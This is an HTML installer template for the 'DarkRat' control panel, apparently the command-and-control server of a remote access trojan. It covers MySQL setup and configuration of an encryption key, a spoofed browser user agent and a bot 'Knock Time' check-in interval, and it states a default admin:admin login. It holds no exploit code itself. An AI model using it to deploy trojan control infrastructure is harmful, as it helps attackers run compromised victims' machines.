<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial;
    background: #27293d;
    color: white;
  width: 1000px;
  margin: 0 auto;
}
input {
width: 100%;
  margin-bottom: 10px;
}
/* Style the tab */
.tab {
  overflow: hidden;
  border: 1px solid #ccc;
  background-color: #f1f1f1;
}

/* Style the buttons inside the tab */
.tab button {
  background-color: inherit;
  float: left;
  border: none;
  outline: none;
  cursor: pointer;
  padding: 14px 16px;
  transition: 0.3s;
  font-size: 17px;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #ddd;
}

/* Create an active/current tablink class */
.tab button.active {
  background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
  display: none;
  padding: 6px 12px;
  border: 1px solid #ccc;
  border-top: none;
}
</style>
</head>
<body>

<h2>DarkRat Installer </h2>

<div class="tab">
  <button class="tablinks" {if $finishing}{else} id="defaultOpen"{/if} onclick="openTab(event, 'Requirements')">Requirements</button>
  <button class="tablinks" onclick="openTab(event, 'Database')">Database</button>
  <button class="tablinks"  {if $finishing}id="defaultOpen" onclick="openTab(event, 'Finishing')" {/if} >Finishing</button>
</div>

<div id="Requirements" class="tabcontent">
 
    {if $return.mysql == "1"}
        MySql Installed
    {else}
        Please Install MYsql
    {/if}
    <hr>



    {foreach from=$return.writable item=dir}
        {$dir} is Writable <br/>
    {/foreach}
    {foreach from=$return.dontwritable item=dir}
         Please make {$dir} Writable <br/>
    {/foreach}

</div>

<div id="Database" class="tabcontent">
  <h3>Create MySql</h3>

  <form method="POST" action="/install?installer=1">Create MySql
    <label>MySQL Username</label>
    <input name="mysqlusername" required>
    <br>
    <label>MySQL Password</label>
    <input name="mysqlpassword" >
    <hr>
    <label>MySQL Database</label>
    <input name="databaseName" required> (Make sure this is Existing)

    <hr>
    <input value="Install" name="install" type="submit">
  </form>



</div>

<div id="Finishing" class="tabcontent">

  <div class="hidden">

  <h3>Welcome to your DarkRat control panel</h3>
  <p>You havn’t configured your DarkRat control panel, yet. Do you wish to do so?</p>
<br>

  <a href="#" onclick="startConfig()" style="color:white;"> Yes, start the configuration.</a>
<br>


<br>

    <a href="/login" style="color:white;"> No, I will do it later.</a>
    <p>Login with admin:admin</p>
</div>
    <div class="finish_config" style="display:none;">
<form method="post">
  <label>Encryption Key</label>
  <input name="encryptionkey" required placeholder=" set a random encryption key (32 Lenght)"><br>
  <label>User Agent</label>
  <input name="useragent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari" required><br>

  <label>new admin password</label> <br>
  <input name="adminPW" placeholder="new admin password" required><br>

  <label>Knock Time</label>
  <input name="requestinterval" value="600" required><br>
  <input type="submit" name="config" value="Finish Setup">
</form>
    </div>





  <br>
<hr>


</div>

<script>
  function startConfig(){

      document.getElementsByClassName("finish_config")[0].style.display = "block";
      document.getElementsByClassName("hidden")[0].style.display = "none";
  }

  {if $step == 2}
    startConfig();
  {/if}

function openTab(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}
document.getElementById("defaultOpen").click();
</script>
   
</body>
</html> 
